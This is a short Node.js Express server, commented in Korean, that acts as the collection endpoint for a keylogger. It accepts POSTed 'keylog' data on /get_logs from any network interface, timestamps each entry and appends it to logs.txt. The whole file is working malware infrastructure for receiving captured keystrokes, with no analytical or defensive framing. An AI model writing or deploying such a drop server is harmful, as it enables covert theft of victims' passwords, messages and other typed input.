const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.json()); //json 형식으로 받기

app.post('/get_logs', (req, res) => {
    const logs = req.body.logs; // 데이터 불러오기
    const logEntry = {
        timestamp: new Date().toISOString(), //날짜
        keylog: logs // 키 로그
    };
    
    const logEntryJSON = JSON.stringify(logEntry)+"\n"; // json형식으로 변환 및 줄 바꿈

    fs.appendFile('logs.txt', logEntryJSON, (err) => { //logs.txt에 logEntryJSON 저장
        if (err) {
            console.error('Error writing to log file', err);
            res.status(500).send({ result: false }); // 저장 실패시 false 반환
        } else {
            res.send({ result: true }); //저장 성공시 ture 반환
        }
    });
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => { // 모든 서버 오픈 if ip===127.0.0.1 로컬 호스트만 오픈
    console.log(`Server is running on http://localhost:${PORT}`);
});